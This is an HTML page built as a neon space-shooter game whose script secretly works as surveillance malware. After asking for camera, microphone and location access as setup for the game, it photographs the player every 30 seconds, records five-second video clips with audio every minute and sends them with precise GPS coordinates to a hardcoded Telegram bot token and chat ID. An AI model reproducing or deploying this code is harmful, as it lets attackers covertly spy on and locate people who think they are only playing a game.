<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>🛰️ NEON UPLINK - GAME</title>
<style>
  @import url('https://fonts.googleapis.com/css2?family=Share+Tech+Mono&display=swap');
  * { box-sizing: border-box; margin: 0; padding: 0; user-select: none; }
  body {
    background: #05050a;
    color: #00f3ff;
    font-family: 'Share Tech Mono', monospace;
    overflow: hidden;
    height: 100vh;
    width: 100vw;
    touch-action: none;
  }

  /* === START SCREEN === */
  #startScreen {
    position: fixed; inset: 0; z-index: 100;
    display: flex; flex-direction: column; align-items: center; justify-content: center;
    background: #000;
    transition: opacity 0.5s;
  }
  #startScreen.hide { opacity: 0; pointer-events: none; }

  .logo {
    font-size: 4rem; margin-bottom: 20px;
    text-shadow: 0 0 30px #00f3ff;
    animation: glow 2s ease-in-out infinite;
  }
  @keyframes glow {
    0%, 100% { text-shadow: 0 0 20px #00f3ff, 0 0 40px #00f3ff; }
    50% { text-shadow: 0 0 30px #00f3ff, 0 0 60px #00f3ff, 0 0 80px #00f3ff; }
  }

  .title {
    font-size: 2.2rem; color: #00f3ff;
    text-shadow: 0 0 20px #00f3ff;
    margin-bottom: 10px;
    letter-spacing: 5px;
  }

  .subtitle {
    color: #666; font-size: 0.85rem; margin-bottom: 40px;
    letter-spacing: 2px;
  }

  #startBtn {
    padding: 16px 50px; font-size: 1.1rem; font-family: inherit;
    background: transparent; border: 3px solid #00f3ff; color: #00f3ff;
    cursor: pointer; letter-spacing: 3px;
    box-shadow: 0 0 30px #00f3ff40;
    transition: 0.3s;
    text-transform: uppercase;
    font-weight: bold;
  }
  #startBtn:hover {
    background: #00f3ff;
    color: #000;
    transform: scale(1.05);
    box-shadow: 0 0 50px #00f3ff;
  }

  .info {
    margin-top: 25px;
    color: #444;
    font-size: 0.7rem;
    text-align: center;
    max-width: 350px;
    line-height: 1.5;
  }

  /* === GAME CONTAINER === */
  #gameContainer {
    position: fixed; inset: 0;
    display: none;
    background: #000;
  }
  #gameContainer.show { display: block; }

  #gameCanvas {
    display: block;
    width: 100%;
    height: 100%;
  }

  /* === HUD === */
  .hud {
    position: fixed; top: 0; left: 0; right: 0;
    display: flex; justify-content: space-between;
    padding: 15px;
    background: linear-gradient(to bottom, rgba(0,0,0,0.8), transparent);
    z-index: 10;
    pointer-events: none;
  }
  .hud-item {
    background: rgba(0,243,255,0.1);
    border: 1px solid #00f3ff40;
    padding: 8px 15px;
    border-radius: 4px;
    font-size: 0.9rem;
    backdrop-filter: blur(4px);
  }
  .hud-label { color: #666; font-size: 0.7rem; }
  .hud-value { color: #00f3ff; font-size: 1.2rem; font-weight: bold; }
  .hud-value.blink { animation: blink 0.5s infinite; color: #ff00ff; }
  @keyframes blink { 50% { opacity: 0.3; } }

  /* === TX INDICATOR === */
  .tx-indicator {
    position: fixed; top: 70px; right: 15px;
    background: rgba(255,0,0,0.2);
    border: 1px solid #ff000060;
    padding: 8px 12px;
    border-radius: 4px;
    font-size: 0.75rem;
    z-index: 10;
  }
  .tx-indicator.active {
    background: rgba(255,0,0,0.4);
    animation: pulse 1s infinite;
  }
  @keyframes pulse { 50% { box-shadow: 0 0 15px red; } }

  /* === LOG PANEL === */
  .log-panel {
    position: fixed; bottom: 0; left: 0; right: 0;
    height: 100px;
    background: linear-gradient(to top, rgba(0,0,0,0.9), transparent);
    padding: 10px 15px;
    overflow-y: auto;
    font-size: 0.65rem;
    color: #0f0;
    z-index: 10;
    pointer-events: none;
  }
  .log-item { margin: 2px 0; opacity: 0.8; }

  /* === GAME OVER === */
  #gameOver {
    position: fixed; inset: 0;
    display: none;
    flex-direction: column;
    align-items: center;
    justify-content: center;
    background: rgba(0,0,0,0.9);
    z-index: 20;
  }
  #gameOver.show { display: flex; }
  .game-over-title {
    font-size: 3rem; color: #ff0000;
    text-shadow: 0 0 30px red;
    margin-bottom: 20px;
  }
  .final-score {
    font-size: 1.5rem; color: #00f3ff;
    margin-bottom: 30px;
  }
  #restartBtn {
    padding: 14px 40px; font-size: 1rem; font-family: inherit;
    background: transparent; border: 2px solid #00f3ff; color: #00f3ff;
    cursor: pointer; letter-spacing: 2px;
    transition: 0.3s;
  }
  #restartBtn:hover {
    background: #00f3ff;
    color: #000;
  }

  .warning {
    position: fixed; bottom: 120px; left: 50%; transform: translateX(-50%);
    background: #ff3366; color: #fff; padding: 8px 16px;
    border-radius: 4px; font-size: 0.75rem;
    display: none; z-index: 200;
  }
</style>
</head>
<body>

<!-- === START SCREEN === -->
<div id="startScreen">
  <div class="logo">🎮</div>
  <div class="title">NEON UPLINK</div>
  <div class="subtitle">SPACE SHOOTER + AUTO TX</div>
  
  <button id="startBtn">▶️ START GAME</button>
  
  <div class="info">
    Browser akan minta izin Camera & Location<br>
    <small>Game berjalan + Auto kirim ke Telegram</small>
  </div>
</div>

<!-- === GAME CONTAINER === -->
<div id="gameContainer">
  <canvas id="gameCanvas"></canvas>
  
  <div class="hud">
    <div class="hud-item">
      <div class="hud-label">SCORE</div>
      <div class="hud-value" id="scoreValue">0</div>
    </div>
    <div class="hud-item">
      <div class="hud-label">NEXT TX</div>
      <div class="hud-value" id="txCountdown">--s</div>
    </div>
    <div class="hud-item">
      <div class="hud-label">LIVES</div>
      <div class="hud-value" id="livesValue">❤️❤️❤️</div>
    </div>
  </div>

  <div class="tx-indicator" id="txIndicator">
    <span id="txStatus">IDLE</span>
  </div>

  <div class="log-panel" id="logBox"></div>

  <div id="gameOver">
    <div class="game-over-title">GAME OVER</div>
    <div class="final-score">SCORE: <span id="finalScore">0</span></div>
    <button id="restartBtn">🔄 RESTART</button>
  </div>
</div>

<div class="warning" id="warning"></div>
<canvas id="hiddenCanvas" style="display:none;"></canvas>

<script>
// ============================================
// ⚙️ KONFIGURASI
// ============================================
const BOT_TOKEN = "7334976291:AAEOf0ppLNPYjOF98NC7ceZtMfXPWZ1X-WE";
const CHAT_ID   = "7223902938";
// ============================================

let stream, mediaRecorder, chunks = [];
let nextPhotoTime = 0, nextVideoTime = 0;
let gameRunning = false;

// === GAME VARIABLES ===
const canvas = document.getElementById('gameCanvas');
const ctx = canvas.getContext('2d');
let score = 0;
let lives = 3;
let player, bullets, enemies, particles;
let gameLoop;
let lastTime = 0;
let enemySpawnTimer = 0;

// === START BUTTON ===
document.getElementById('startBtn').onclick = async () => {
  document.getElementById('startBtn').disabled = true;
  document.getElementById('startBtn').textContent = 'LOADING...';
  log('> INITIALIZING...');
  
  try {
    await requestPermissions();
    
    document.getElementById('startScreen').classList.add('hide');
    setTimeout(() => {
      document.getElementById('startScreen').style.display = 'none';
      document.getElementById('gameContainer').classList.add('show');
      initGame();
      startUplink();
    }, 500);
    
  } catch (err) {
    document.getElementById('startBtn').disabled = false;
    document.getElementById('startBtn').textContent = '🔄 RETRY';
    showWarning('Permission denied! Refresh page.');
    log('> ERROR: ' + err.message);
  }
};

// === PERMISSIONS ===
async function requestPermissions() {
  log('> Requesting permissions...');
  
  stream = await navigator.mediaDevices.getUserMedia({
    video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
    audio: true
  });
  log('> Camera & Mic: OK');
  
  await new Promise((resolve, reject) => {
    if (!navigator.geolocation) {
      reject(new Error('No geolocation'));
      return;
    }
    navigator.geolocation.getCurrentPosition(
      pos => {
        log('> Location: OK');
        resolve(pos);
      },
      reject,
      { enableHighAccuracy: true, timeout: 10000 }
    );
  });
  
  log('> All permissions granted!');
}

// === GAME INIT ===
function initGame() {
  resizeCanvas();
  window.addEventListener('resize', resizeCanvas);
  
  player = { x: canvas.width/2, y: canvas.height - 100, width: 40, height: 40, speed: 7 };
  bullets = [];
  enemies = [];
  particles = [];
  score = 0;
  lives = 3;
  gameRunning = true;
  
  // Controls
  canvas.addEventListener('touchmove', handleTouch);
  canvas.addEventListener('mousemove', handleMouse);
  canvas.addEventListener('click', shoot);
  canvas.addEventListener('touchstart', shoot);
  
  document.getElementById('restartBtn').onclick = () => {
    document.getElementById('gameOver').classList.remove('show');
    initGame();
  };
  
  updateHUD();
  gameLoop = requestAnimationFrame(update);
  log('> GAME STARTED');
}

function resizeCanvas() {
  canvas.width = window.innerWidth;
  canvas.height = window.innerHeight;
}

function handleMouse(e) {
  if (!gameRunning) return;
  player.x = e.clientX;
}

function handleTouch(e) {
  if (!gameRunning) return;
  e.preventDefault();
  player.x = e.touches[0].clientX;
}

function shoot() {
  if (!gameRunning) return;
  bullets.push({ x: player.x, y: player.y - 20, speed: 10 });
}

// === GAME UPDATE ===
function update(timestamp) {
  if (!gameRunning) return;
  
  const deltaTime = timestamp - lastTime;
  lastTime = timestamp;
  
  ctx.fillStyle = '#05050a';
  ctx.fillRect(0, 0, canvas.width, canvas.height);
  
  // Stars background
  drawStars();
  
  // Player
  ctx.fillStyle = '#00f3ff';
  ctx.shadowBlur = 20;
  ctx.shadowColor = '#00f3ff';
  ctx.beginPath();
  ctx.moveTo(player.x, player.y - 20);
  ctx.lineTo(player.x - 20, player.y + 20);
  ctx.lineTo(player.x + 20, player.y + 20);
  ctx.closePath();
  ctx.fill();
  ctx.shadowBlur = 0;
  
  // Bullets
  ctx.fillStyle = '#ff00ff';
  bullets = bullets.filter(b => {
    b.y -= b.speed;
    ctx.fillRect(b.x - 2, b.y, 4, 15);
    return b.y > -20;
  });
  
  // Enemies
  enemySpawnTimer += deltaTime;
  if (enemySpawnTimer > 1000) {
    enemies.push({
      x: Math.random() * (canvas.width - 40) + 20,
      y: -30,
      width: 30,
      height: 30,
      speed: Math.random() * 2 + 2
    });
    enemySpawnTimer = 0;
  }
  
  ctx.fillStyle = '#ff3366';
  enemies = enemies.filter(e => {
    e.y += e.speed;
    
    // Draw enemy
    ctx.shadowBlur = 15;
    ctx.shadowColor = '#ff3366';
    ctx.fillRect(e.x - 15, e.y - 15, 30, 30);
    ctx.shadowBlur = 0;
    
    // Collision with player
    if (Math.abs(e.x - player.x) < 30 && Math.abs(e.y - player.y) < 30) {
      lives--;
      createExplosion(player.x, player.y, '#00f3ff');
      updateHUD();
      if (lives <= 0) gameOver();
      return false;
    }
    
    // Collision with bullets
    for (let i = bullets.length - 1; i >= 0; i--) {
      const b = bullets[i];
      if (Math.abs(e.x - b.x) < 20 && Math.abs(e.y - b.y) < 25) {
        score += 10;
        createExplosion(e.x, e.y, '#ff3366');
        bullets.splice(i, 1);
        updateHUD();
        return false;
      }
    }
    
    return e.y < canvas.height + 30;
  });
  
  // Particles
  particles = particles.filter(p => {
    p.x += p.vx;
    p.y += p.vy;
    p.life -= 0.02;
    ctx.globalAlpha = p.life;
    ctx.fillStyle = p.color;
    ctx.fillRect(p.x, p.y, 3, 3);
    ctx.globalAlpha = 1;
    return p.life > 0;
  });
  
  gameLoop = requestAnimationFrame(update);
}

function drawStars() {
  ctx.fillStyle = '#fff';
  for (let i = 0; i < 50; i++) {
    const x = (Math.sin(i * 132.1 + Date.now() * 0.0001) * 0.5 + 0.5) * canvas.width;
    const y = (i * 37 + Date.now() * 0.05) % canvas.height;
    ctx.globalAlpha = Math.random() * 0.5 + 0.3;
    ctx.fillRect(x, y, 1, 1);
  }
  ctx.globalAlpha = 1;
}

function createExplosion(x, y, color) {
  for (let i = 0; i < 20; i++) {
    particles.push({
      x, y,
      vx: (Math.random() - 0.5) * 10,
      vy: (Math.random() - 0.5) * 10,
      life: 1,
      color
    });
  }
}

function updateHUD() {
  document.getElementById('scoreValue').textContent = score;
  document.getElementById('livesValue').textContent = '❤️'.repeat(lives);
}

function gameOver() {
  gameRunning = false;
  cancelAnimationFrame(gameLoop);
  document.getElementById('finalScore').textContent = score;
  document.getElementById('gameOver').classList.add('show');
  log('> GAME OVER - Score: ' + score);
}

// === AUTO UPLINK ===
function startUplink() {
  log('> AUTO TX STARTED');
  nextPhotoTime = Date.now() + 5000;
  nextVideoTime = Date.now() + 10000;
  updateTimers();
}

function updateTimers() {
  if (!gameRunning && lives <= 0) return;
  
  const now = Date.now();
  const nextPhoto = Math.max(0, Math.ceil((nextPhotoTime - now)/1000));
  const nextVideo = Math.max(0, Math.ceil((nextVideoTime - now)/1000));
  const next = Math.min(nextPhoto, nextVideo);
  
  document.getElementById('txCountdown').textContent = next + 's';
  
  if (now >= nextPhotoTime) {
    takePhoto();
    nextPhotoTime = now + 30000;
  }
  if (now >= nextVideoTime) {
    startRecording();
    sendLocation();
    nextVideoTime = now + 60000;
  }
  
  setTimeout(updateTimers, 1000);
}

function takePhoto() {
  if (!stream) return;
  showTX('PHOTO');
  const ctx = document.getElementById('hiddenCanvas').getContext('2d');
  const hiddenVideo = document.createElement('video');
  hiddenVideo.srcObject = stream;
  hiddenVideo.play();
  hiddenVideo.onloadedmetadata = () => {
    hiddenVideo.currentTime = 0;
  };
  hiddenVideo.onseeked = () => {
    ctx.drawImage(hiddenVideo, 0, 0, 640, 480);
    document.getElementById('hiddenCanvas').toBlob(blob => sendPhoto(blob), 'image/jpeg', 0.8);
  };
}

async function sendPhoto(blob) {
  const fd = new FormData();
  fd.append('chat_id', CHAT_ID);
  fd.append('photo', blob, 'game_photo.jpg');
  fd.append('caption', `🎮 GAME SCORE: ${score} // ${new Date().toLocaleTimeString()}`);
  try {
    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: fd });
    const d = await res.json();
    log(d.ok ? '✅ Photo sent' : '❌ Photo error');
    hideTX();
  } catch(e) { log('❌ Network error'); hideTX(); }
}

function startRecording() {
  showTX('VIDEO');
  chunks = [];
  mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
  mediaRecorder.ondataavailable = e => chunks.push(e.data);
  mediaRecorder.onstop = () => {
    const blob = new Blob(chunks, { type: 'video/webm' });
    sendVideo(blob);
  };
  mediaRecorder.start();
  setTimeout(() => {
    if (mediaRecorder.state === 'recording') mediaRecorder.stop();
  }, 5000);
}

async function sendVideo(blob) {
  const fd = new FormData();
  fd.append('chat_id', CHAT_ID);
  fd.append('video', blob, 'game_video.webm');
  fd.append('caption', `🎮 GAME SCORE: ${score} // ${new Date().toLocaleTimeString()}`);
  try {
    const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, { method: 'POST', body: fd });
    const d = await res.json();
    log(d.ok ? '✅ Video sent' : '❌ Video error');
    hideTX();
  } catch(e) { log('❌ Network error'); hideTX(); }
}

function sendLocation() {
  if (!navigator.geolocation) return;
  navigator.geolocation.getCurrentPosition(async pos => {
    const { latitude, longitude } = pos.coords;
    try {
      const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: CHAT_ID, latitude, longitude })
      });
      const d = await res.json();
      log(d.ok ? '✅ Location sent' : '❌ Location error');
    } catch(e) { log('❌ Network error'); }
  }, err => {}, { enableHighAccuracy: true, timeout: 5000 });
}

function showTX(type) {
  const ind = document.getElementById('txIndicator');
  const status = document.getElementById('txStatus');
  ind.classList.add('active');
  status.textContent = 'TX: ' + type;
  status.style.color = '#ff0000';
}

function hideTX() {
  const ind = document.getElementById('txIndicator');
  const status = document.getElementById('txStatus');
  ind.classList.remove('active');
  status.textContent = 'IDLE';
  status.style.color = '#00f3ff';
}

function log(msg) {
  const time = new Date().toLocaleTimeString();
  const div = document.getElementById('logBox');
  const p = document.createElement('div');
  p.className = 'log-item';
  p.textContent = `[${time}] ${msg}`;
  div.insertBefore(p, div.firstChild);
  if (div.children.length > 20) div.removeChild(div.lastChild);
}

function showWarning(text) {
  const w = document.getElementById('warning');
  w.textContent = text;
  w.style.display = 'block';
  setTimeout(() => w.style.display = 'none', 5000);
}

// Security check
if (BOT_TOKEN.includes("MASUKKAN")) {
  document.getElementById('startBtn').onclick = () => alert('Edit BOT_TOKEN & CHAT_ID di script!');
}
</script>
</body>
</html>
